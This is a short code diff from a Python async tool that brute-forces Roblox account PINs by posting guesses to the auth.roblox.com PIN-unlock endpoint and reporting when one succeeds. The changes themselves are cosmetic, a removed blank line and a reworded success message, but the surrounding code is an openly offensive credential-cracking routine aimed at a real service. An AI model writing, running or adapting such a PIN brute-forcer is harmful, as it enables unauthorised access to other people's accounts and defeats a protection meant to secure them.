@@ -21,7 +21,6 @@ async def start(self):
                     if resp == 1:
                         break
 
-
     except Exception:
         traceback.print_exc()
 
@@ -29,7 +28,7 @@ async def crack(session, pin):
     while True:
         async with session.post("https://auth.roblox.com/v1/account/pin/unlock", data={"pin":f"{pin}"}) as response:
             if response.status == 200:
-                cprint.custom(f"Pin found: {pin}", "SUCCESS", (0,255,0))
+                cprint.success(f"Pin found: {pin}")
                 return 1
 
             if response.status == 403:
